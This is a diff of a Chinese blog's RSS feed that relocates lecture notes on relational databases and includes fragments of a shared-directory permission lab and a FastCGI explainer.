-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221022235809958.png&#34; alt=&#34;image-20221022235809958&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;利用账号 zhangsan 挂载目录到本地&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000130466.png&#34; alt=&#34;image-20221023000130466&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;进入挂载目录创建目录文件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000217590.png&#34; alt=&#34;image-20221023000217590&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;给共享目录设置防删除位&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000438265.png&#34; alt=&#34;image-20221023000438265&#34; /&gt;&lt;/p&gt;
-&lt;h5 id=&#34;test-one&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#test-one&#34;&gt;#&lt;/a&gt; test-one&lt;/h5&gt;
-&lt;p&gt;windows 账号 lisi 删除 zhangsan 创建的文件失败&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000515094.png&#34; alt=&#34;image-20221023000515094&#34; /&gt;&lt;/p&gt;
-&lt;h5 id=&#34;test-two&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#test-two&#34;&gt;#&lt;/a&gt; test-two&lt;/h5&gt;
-&lt;p&gt;zhangsan 删除 lisi 用户文件失败&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221023000623905.png&#34; alt=&#34;image-20221023000623905&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;3实验小结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3实验小结&#34;&gt;#&lt;/a&gt; 3. 实验小结&lt;/h3&gt;
- ]]></description>
-        </item>
-        <item>
             <guid isPermalink="true">https://blog.xcu.icu/2022/10/24/user.ini%E5%92%8Chtaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/</guid>
             <title>user.ini和htaccess文件的利用</title>
             <link>https://blog.xcu.icu/2022/10/24/user.ini%E5%92%8Chtaccess%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%A9%E7%94%A8/</link>
@@ -2229,307 +2167,6 @@ CGI 程序的每一次 web 请求都会有启动和退出过程 —— 每次 HT
 &lt;h5 id=&#34;fastcgi解决方案&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fastcgi解决方案&#34;&gt;#&lt;/a&gt; FastCGI 解决方案&lt;/h5&gt;
 &lt;p&gt;Master-Worker 模式&lt;/p&gt;
 &lt;p&gt;Fastcgi 会先启一个 master，解析配置文件，初始化执行环境，然后再启动多个 worker。当请求过来时，master 会传递给一个 worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率自然提高。而且当 worker 不够用时，master 可以根据配置预先启动几个 worker 等着；当然空闲 worker 太多时，也会停掉一些，这样就提高了性能，也节约了资源。这就是 fastcgi 的对进程的管理。&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/</guid>
-            <title>关系数据库</title>
-            <link>https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/</link>
-            <category term="关系数据库" scheme="https://blog.xcu.icu/categories/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/" />
-            <category term="数据库" scheme="https://blog.xcu.icu/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
-            <pubDate>Mon, 24 Oct 2022 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;[TOC]&lt;/p&gt;
-&lt;h2 id=&#34;21关系数据库结构及形式化定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21关系数据库结构及形式化定义&#34;&gt;#&lt;/a&gt; 2.1 关系数据库结构及形式化定义&lt;/h2&gt;
-&lt;h3 id=&#34;211关系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#211关系&#34;&gt;#&lt;/a&gt; 2.1.1 关系&lt;/h3&gt;
-&lt;p&gt;单一的数据结构 -- 关系&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;现实世界的实体以及实体之间的关系均用关系来表示&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;逻辑结构 --- 二维表&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;从用户角度，关系模型中数据的逻辑结构是一张二维表&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域&#34;&gt;#&lt;/a&gt; 域&lt;/h4&gt;
-&lt;p&gt;域是一组具有相同数据类型的值的集合&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;整数、实数、自然数&lt;/li&gt;
-&lt;li&gt;某一个范围的数&lt;/li&gt;
-&lt;li&gt;指定长度的字符串集合&lt;/li&gt;
-&lt;li ’男‘，‘女’=&#34;&#34;&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;笛卡尔积&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#笛卡尔积&#34;&gt;#&lt;/a&gt; 笛卡尔积&lt;/h4&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;笛卡尔积&lt;/p&gt;
-&lt;p&gt;给定一组域 D1，D2，…，Dn，这些域中可以有相同的。    D1，D2，…，Dn 的笛卡尔积为：    D1×D2×…×Dn ＝ ｛（d1，d2，…，dn）｜diDi，i＝1，2，…，n&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;所有域的所有取值的一个组合&lt;/li&gt;
-&lt;li&gt;不能重复&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;元组&lt;/p&gt;
-&lt;p&gt;笛卡尔积中每一个元素（d1，d2，…，dn）叫作一个 n 元组（n-tuple）或简称元组 (Tuple)&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;分量&lt;/p&gt;
-&lt;p&gt;笛卡尔积元素（d1，d2，…，dn）中的每一个值 di 叫作一个分量&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;基数&lt;/p&gt;
-&lt;p&gt;若 Di（i＝1，2，…，n）为有限集，其基数 (域中所包含的值的个数) 为 mi（i＝1，2，…，n），则 D1×D2×…×Dn 的基数 M 为：&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220918183227871.png&#34; alt=&#34;image-20220918183227871&#34; /&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;笛卡尔积的表示方法&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;笛卡尔积可以表示为一个二维表&lt;/li&gt;
-&lt;li&gt;表中的每行对应一个元组，表中的每列对应一个域&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;关系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关系&#34;&gt;#&lt;/a&gt; 关系&lt;/h4&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;关系&lt;br /&gt;
- D1×D2×…×Dn 的子集叫作在域 D1，D2，…，Dn 上的关系，表示为 ：&lt;br /&gt;
-R（D1，D2，…，Dn）&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;关系名&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;关系的目或者度&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;单元关系于二元关系&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;当 n=1 时，称该关系为单元关系或者一元关系&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;关系的表示&lt;/p&gt;
-&lt;p&gt;关系也是一个二维表，表的每行对应一个元组，表的每列对应一个域&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;属性&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;关系中不同列可以对应相同的域&lt;/li&gt;
-&lt;li&gt;为了加以区分，必须对每列起一个名字，称为属性（Attribute）名&lt;/li&gt;
-&lt;li&gt;n 目关系必有 n 个属性&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;码&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;候选码（Candidate key）：若关系中的某一属性组的值能唯一地标识一个元组，则称该属性组为候选码&lt;/li&gt;
-&lt;li&gt;全码（All-key）：关系模式的所有属性是这个关系模式的候选码，称为全码&lt;/li&gt;
-&lt;li&gt;主码（Primary key）：若一个关系有多个候选码，则选定其中一个为主码&lt;/li&gt;
-&lt;li&gt;外部码：不是当前关系的码，但是其它关系的主码&lt;/li&gt;
-&lt;li&gt;主属性：包含在任何候选码中的属性称为主属性。&lt;/li&gt;
-&lt;li&gt;非主属性：不包含在任何侯选码中的属性称为非主属性（ Non-Prime attribute）或非码属性（Non-key attribute）&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;三类关系&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;基本关系（基本表或者基表）&lt;/p&gt;
-&lt;p&gt;实际存在的表，是实际存储数据的逻辑表示&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;查询表&lt;/p&gt;
-&lt;p&gt;查询结果对应的表&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;视图表&lt;/p&gt;
-&lt;p&gt;由基本表或者其他识图表导出的表，是虚表，不对应实际的数据&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;基本关系的性质&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;列是同质的&lt;/li&gt;
-&lt;li&gt;不同的列可以出自一个域&lt;br /&gt;
-其中每个列称为一个属性&lt;br /&gt;
-不同的属性要给与不同的属性名&lt;/li&gt;
-&lt;li&gt;列的顺序无所谓，列的次序可以任意交换&lt;/li&gt;
-&lt;li&gt;任意两个元组的候选码不能相同&lt;/li&gt;
-&lt;li&gt;行的顺序无所谓，行的次序可以任意交换&lt;/li&gt;
-&lt;li&gt;分量必须取原子值（最基本的）&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;222-关系模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#222-关系模式&#34;&gt;#&lt;/a&gt; 2.2.2、关系模式&lt;/h3&gt;
-&lt;h4 id=&#34;什么是关系模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是关系模型&#34;&gt;#&lt;/a&gt; 什么是关系模型&lt;/h4&gt;
-&lt;p&gt;关系模式（型）&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;对关系的描述&lt;/li&gt;
-&lt;li&gt;静态的稳定的&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;关系（值）&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;关系模式在某一个时刻的状态或者内容&lt;/li&gt;
-&lt;li&gt;动态的，随时间变化的&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;关系是元组的集合，因此关系模式必须指出这个元组集合的结构，即它由哪些组成，这些属性来自哪些域，以及属性与域之间的映像关系。&lt;/p&gt;
-&lt;h4 id=&#34;定义关系模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#定义关系模型&#34;&gt;#&lt;/a&gt; 定义关系模型&lt;/h4&gt;
-&lt;p&gt;关系模式可以形式化的表示为：&lt;/p&gt;
-&lt;p&gt;​	R（U，D，DOM，F）&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;R       关系名&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;U       组成该关系的属性名集合&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;D       属性组 U 中属性所来自的域&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;DOM  属性向域的映象集合&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;F        属性间的数据依赖关系集合&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;关系定义模式通常可以简记为&lt;/p&gt;
-&lt;p&gt;R(U)&lt;/p&gt;
-&lt;p&gt;关系模式何关系往往统称为关系&lt;/p&gt;
-&lt;h4 id=&#34;关系模型的存储结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关系模型的存储结构&#34;&gt;#&lt;/a&gt; 关系模型的存储结构&lt;/h4&gt;
-&lt;ul&gt;
-&lt;li&gt;关系模型的逻辑结构 - 表&lt;/li&gt;
-&lt;li&gt;关系模型的物理结构
-&lt;ol&gt;
-&lt;li&gt;有的关系数据库管理中一个表对应一个操作系统文件，将物理数据组织交给操作系统完成；&lt;/li&gt;
-&lt;li&gt;有的关系数据库系统从操作系统那里申请若干个大的文件，自己划分文件空间，组织表，索引等存储结构，并进行存储管理。&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;223关系数据库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#223关系数据库&#34;&gt;#&lt;/a&gt; 2.2.3 关系数据库&lt;/h3&gt;
-&lt;p&gt;在一个给定的应用领域中，所有关系的集合构成一个关系数据库&lt;/p&gt;
-&lt;p&gt;关系数据库也有型和值之分&lt;/p&gt;
-&lt;h2 id=&#34;22关系操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22关系操作&#34;&gt;#&lt;/a&gt; 2.2 关系操作&lt;/h2&gt;
-&lt;h3 id=&#34;221-基本关系操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#221-基本关系操作&#34;&gt;#&lt;/a&gt; 2.2.1、基本关系操作&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;常用的关系操作
-&lt;ul&gt;
-&lt;li&gt;查询：选择、投影、连接、除、并、交、差、笛卡尔积&lt;/li&gt;
-&lt;li&gt;数据更新：插入、删除、修改&lt;/li&gt;
-&lt;li&gt;选择、投影、并、差、笛卡尔积是 5 种基本操作&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;关系操作的特点
-&lt;ul&gt;
-&lt;li&gt;集合操作方式：操作的对象和结果都是集合，一次一集合的方式&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;222-关系数据库语言的分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#222-关系数据库语言的分类&#34;&gt;#&lt;/a&gt; 2.2.2、关系数据库语言的分类&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;关系代数语言&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;用对关系的运算来表达查询要求&lt;/li&gt;
-&lt;li&gt;代表 ISBL&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;关系演算语言：用谓词来表达查询要求&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;元组关系演算语言&lt;br /&gt;
-谓词变元的基本对象是元组变量&lt;/p&gt;
-&lt;p&gt;代表：APLHA, QUEL&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;域关系演算语言&lt;/p&gt;
-&lt;p&gt;谓词变元的基本对象是域变量&lt;/p&gt;
-&lt;p&gt;代表：QBE&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;介于关系代数何关系演算之间的语言&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;代表 SQL&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;每一个 ISBL 语句都近似于关系代数表达式&lt;br /&gt;
-关系代数、关系演算语言均是抽象的查询语言，这些抽象的语言与具体的关系数据库管理系统中实现的实际语言并不完全一样。但它们能用作评估实际系统中查询语言能力的标准或基础。&lt;/p&gt;
-&lt;h2 id=&#34;23关系的完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23关系的完整性&#34;&gt;#&lt;/a&gt; 2.3 关系的完整性&lt;/h2&gt;
-&lt;h3 id=&#34;231-关系的三类完整性约束&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#231-关系的三类完整性约束&#34;&gt;#&lt;/a&gt; 2.3.1 关系的三类完整性约束&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;实体完整性何参照完整性&lt;br /&gt;
-关系模型必须满足的完整性约束条件，称为关系的两个不变性，应该由关系系统自动支持&lt;/li&gt;
-&lt;li&gt;用户定义完整性&lt;br /&gt;
-应用领域需要遵循的约束条件，体现了具体领域中的语义约束&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;232-实体完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#232-实体完整性&#34;&gt;#&lt;/a&gt; 2.3.2 实体完整性&lt;/h3&gt;
-&lt;p&gt;(1) 实体完整性规则是针对基本关系而言的。一个基本表通常对应现实世界的一个实体集。&lt;/p&gt;
-&lt;p&gt;(2) 现实世界中的实体是可区分的，即它们具有某种唯一性标识。&lt;/p&gt;
-&lt;p&gt;(3) 关系模型中以主码作为唯一性标识。&lt;/p&gt;
-&lt;p&gt;(4) 主码中的属性即主属性不能取空值。&lt;/p&gt;
-&lt;h3 id=&#34;233-参照完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#233-参照完整性&#34;&gt;#&lt;/a&gt; 2.3.3 参照完整性&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;关系间的引用&lt;/p&gt;
-&lt;p&gt;在关系模型中实体及实体间的联系都是用关系来描     述的，因此可能存在着关系与关系间的引用。&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;外码&lt;br /&gt;
-外码：设 F 是基本关系 R 的一个或一组属性，但不是关系 R 的码。如果 F 与基本关系 S 的主码 Ks 相对应，则称 F 是基本关系 R 的外码。&lt;/p&gt;
-&lt;p&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;基本关系R称为参照关系
-基本关系S称为被参照关系或目标关系&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;参照完整性规则&lt;br /&gt;
-若属性（或属性组）F 是基本关系 R 的外码，它与基本关系 S 的主码 Ks 相对应（基本关系 R 和 S 不一定是不同的关系），则对于 R 中每个元组在 F 上的值必须为：&lt;br /&gt;
-或者取空值（F 的每个属性值均为空值）&lt;br /&gt;
-或者等于 S 中某个元组的主码值&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;234-用户定义的完整性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#234-用户定义的完整性&#34;&gt;#&lt;/a&gt; 2.3.4 用户定义的完整性&lt;/h3&gt;
-&lt;ul&gt;
-&lt;li&gt;针对某一具体关系数据库的约束条件，反映某一具体应用所涉及的数据必须满足的语义要求&lt;/li&gt;
-&lt;li&gt;关系模型应提供定义和检验这类完整性的机制，以便用统一的系统的方法处理它们，而不要由应用程序承担这一功能&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;24关系代数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#24关系代数&#34;&gt;#&lt;/a&gt; 2.4 关系代数&lt;/h2&gt;
-&lt;p&gt;关系代数&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;一种抽象的查询语言&lt;/li&gt;
-&lt;li&gt;用对关系的运算来表达查询&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;关系代数的三个要素&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;运算对象：关系&lt;/li&gt;
-&lt;li&gt;运算结果：关系&lt;/li&gt;
-&lt;li&gt;运算符：4 类&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;集合运算符（）&amp;lt;img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzQ3NTc2NjYucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923174757666.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220923174757666&amp;quot; style=&amp;quot;zoom: 50%;&amp;quot; /&amp;gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;将关系看成元组的集合&lt;/li&gt;
-&lt;li&gt;运算是从关系的 “水平” 方向即行的角度来进行&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;专门的关系运算符 &amp;lt; img src=&amp;quot;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzUwMDc3ODYucG5n&#34;&gt;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923175007786.png&lt;/span&gt;&amp;quot; alt=&amp;quot;image-20220923175007786&amp;quot; style=&amp;quot;zoom:50%;&amp;quot; /&amp;gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;不仅涉及行而且涉及列&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;关系代数运算的分类&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;传统的集合运算&lt;/p&gt;
-&lt;p&gt;并、差、交、广义笛卡尔积&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;专门的关系运算&lt;/p&gt;
-&lt;p&gt;选择、投影、连接、除&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
  ]]></description>
         </item>
         <item>
@@ -2889,6 +2526,307 @@ select username from user id&amp;#x3D;$id
  ]]></description>
         </item>
         <item>
+            <guid isPermalink="true">https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/</guid>
+            <title>关系数据库</title>
+            <link>https://blog.xcu.icu/2022/10/24/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/</link>
+            <category term="关系数据库" scheme="https://blog.xcu.icu/categories/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/" />
+            <category term="数据库" scheme="https://blog.xcu.icu/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
+            <pubDate>Mon, 24 Oct 2022 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;[TOC]&lt;/p&gt;
+&lt;h2 id=&#34;21关系数据库结构及形式化定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21关系数据库结构及形式化定义&#34;&gt;#&lt;/a&gt; 2.1 关系数据库结构及形式化定义&lt;/h2&gt;
+&lt;h3 id=&#34;211关系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#211关系&#34;&gt;#&lt;/a&gt; 2.1.1 关系&lt;/h3&gt;
+&lt;p&gt;单一的数据结构 -- 关系&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;现实世界的实体以及实体之间的关系均用关系来表示&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;逻辑结构 --- 二维表&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;从用户角度，关系模型中数据的逻辑结构是一张二维表&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域&#34;&gt;#&lt;/a&gt; 域&lt;/h4&gt;
+&lt;p&gt;域是一组具有相同数据类型的值的集合&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;整数、实数、自然数&lt;/li&gt;
+&lt;li&gt;某一个范围的数&lt;/li&gt;
+&lt;li&gt;指定长度的字符串集合&lt;/li&gt;
+&lt;li ’男‘，‘女’=&#34;&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;笛卡尔积&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#笛卡尔积&#34;&gt;#&lt;/a&gt; 笛卡尔积&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;笛卡尔积&lt;/p&gt;
+&lt;p&gt;给定一组域 D1，D2，…，Dn，这些域中可以有相同的。    D1，D2，…，Dn 的笛卡尔积为：    D1×D2×…×Dn ＝ ｛（d1，d2，…，dn）｜diDi，i＝1，2，…，n&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;所有域的所有取值的一个组合&lt;/li&gt;
+&lt;li&gt;不能重复&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;元组&lt;/p&gt;
+&lt;p&gt;笛卡尔积中每一个元素（d1，d2，…，dn）叫作一个 n 元组（n-tuple）或简称元组 (Tuple)&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;分量&lt;/p&gt;
+&lt;p&gt;笛卡尔积元素（d1，d2，…，dn）中的每一个值 di 叫作一个分量&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;基数&lt;/p&gt;
+&lt;p&gt;若 Di（i＝1，2，…，n）为有限集，其基数 (域中所包含的值的个数) 为 mi（i＝1，2，…，n），则 D1×D2×…×Dn 的基数 M 为：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220918183227871.png&#34; alt=&#34;image-20220918183227871&#34; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;笛卡尔积的表示方法&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;笛卡尔积可以表示为一个二维表&lt;/li&gt;
+&lt;li&gt;表中的每行对应一个元组，表中的每列对应一个域&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;关系&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关系&#34;&gt;#&lt;/a&gt; 关系&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;关系&lt;br /&gt;
+ D1×D2×…×Dn 的子集叫作在域 D1，D2，…，Dn 上的关系，表示为 ：&lt;br /&gt;
+R（D1，D2，…，Dn）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;关系名&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;关系的目或者度&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;单元关系于二元关系&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;当 n=1 时，称该关系为单元关系或者一元关系&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;关系的表示&lt;/p&gt;
+&lt;p&gt;关系也是一个二维表，表的每行对应一个元组，表的每列对应一个域&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;属性&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;关系中不同列可以对应相同的域&lt;/li&gt;
+&lt;li&gt;为了加以区分，必须对每列起一个名字，称为属性（Attribute）名&lt;/li&gt;
+&lt;li&gt;n 目关系必有 n 个属性&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;码&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;候选码（Candidate key）：若关系中的某一属性组的值能唯一地标识一个元组，则称该属性组为候选码&lt;/li&gt;
+&lt;li&gt;全码（All-key）：关系模式的所有属性是这个关系模式的候选码，称为全码&lt;/li&gt;
+&lt;li&gt;主码（Primary key）：若一个关系有多个候选码，则选定其中一个为主码&lt;/li&gt;
+&lt;li&gt;外部码：不是当前关系的码，但是其它关系的主码&lt;/li&gt;
+&lt;li&gt;主属性：包含在任何候选码中的属性称为主属性。&lt;/li&gt;
